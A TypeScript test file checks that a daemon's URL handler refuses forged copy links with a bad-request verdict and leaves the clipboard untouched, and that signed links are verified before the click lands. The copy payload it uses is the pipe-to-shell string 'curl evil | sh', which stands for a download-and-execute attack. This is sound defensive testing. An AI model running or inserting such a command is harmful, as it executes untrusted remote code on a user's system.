// The URL handler's frame is answered with its verdict as soon as the host has
// read it, and its click lands after: a forged link reaches no renderer and
// its sender is told why, and a slow click that lands is never told as failed.

import { handleRequest, type HandledRequest } from "../src/daemon/reply";
import type { DaemonParts } from "../src/daemon/daemon-parts";
import { MenuIdle } from "../src/daemon/menu-idle";
import { RuntimeStats } from "../src/daemon/stats";
import { ProbeArrivals } from "../src/doctor/handler-probe";
import { SessionState } from "../src/renderer/session-state";
import { effectsUrl, VERB_COPY } from "../src/click/wire";
import { URL_FRAME_VERSION } from "../src/daemon/foundations/protocol";
import { instantOf } from "../src/utils/instant";
import { systemTimekeeper } from "../src/time";
import { clickParts } from "./helpers/click-parts";
import { testVerbContext } from "./helpers/click";
import { TEST_SIGNER } from "./helpers/link-signer";

const COPY = effectsUrl([{ verb: VERB_COPY, args: ["curl evil | sh"] }]);

function host(copying: Promise<void> = Promise.resolve()) {
  const copied: string[] = [];
  const idle = new MenuIdle({
    clock: systemTimekeeper,
    now: () => instantOf(new Date()),
    close: async () => null,
    failed: () => {},
  });
  const {
    arrival: _a,
    turnWaited: _t,
    placeWaited: _p,
    gatherTook: _g,
    clientGone: _c,
    latest: _l,
    ...verbCtx
  } = testVerbContext(new SessionState());
  const events: string[] = [];
  const parts = {
    clock: systemTimekeeper,
    menuIdle: idle,
    payloadProviders: {},
    frameFeeds: { latest: () => null },
    handlerProbes: new ProbeArrivals(),
    log: (_level: string, line: string) => events.push(line),
    ...clickParts(verbCtx, idle, undefined, {
      // The clipboard, as the host's copy writes it.
      interpreter: {
        perform: async (act) => {
          await copying;
          if (act.kind === "copy") copied.push(act.text);
          return { kind: "ok" };
        },
        endsInTurn: () => true,
      },
      unseen: () => {},
    }),
  } as unknown as DaemonParts;
  const frame = async (url: string, urlV = URL_FRAME_VERSION) => {
    const handled = await handleRequest(
      parts,
      { kind: "url", frame: { kind: "url", urlV, url } },
      () => false,
      new RuntimeStats(systemTimekeeper).accept(),
      () => false,
    );
    if (handled.kind !== "url") throw new Error(`answered ${handled.kind}`);
    return handled as Extract<HandledRequest, { kind: "url" }>;
  };
  return { frame, copied, events, idle };
}

test("a forged copy link is refused at once, saying why, and the clipboard is untouched", async () => {
  const h = host();
  const signed = TEST_SIGNER.signLink(COPY);
  const at = signed.indexOf("evil");
  const forged = `${signed.slice(0, at)}EVIL${signed.slice(at + 4)}`;
  for (const url of [forged, COPY]) {
    const answered = await h.frame(url);
    expect(answered.awaitsVerdict).toBe(true);
    expect(answered.verdict).toMatchObject({ ok: false, code: "BAD_REQUEST" });
    await answered.land();
  }
  expect(h.copied).toEqual([]);
  expect(h.events).toHaveLength(2);
  for (const event of h.events) expect(event).toContain("outcome=bad-request");
  h.idle.dispose();
});

test("a link the bar drew is told verified before its click lands, and then lands", async () => {
  let release = () => {};
  const h = host(new Promise<void>((done) => (release = done)));
  const answered = await h.frame(TEST_SIGNER.signLink(COPY));
  expect(answered.verdict).toEqual({ ok: true, output: "" });
  expect(h.copied).toEqual([]);
  release();
  await answered.land();
  expect(h.copied).toEqual(["curl evil | sh"]);
  h.idle.dispose();
});

test("a version 1 frame's writer has hung up, so its verdict goes to no one", async () => {
  const h = host();
  const answered = await h.frame(TEST_SIGNER.signLink(COPY), 1);
  expect(answered.awaitsVerdict).toBe(false);
  await answered.land();
  expect(h.copied).toEqual(["curl evil | sh"]);
  h.idle.dispose();
});
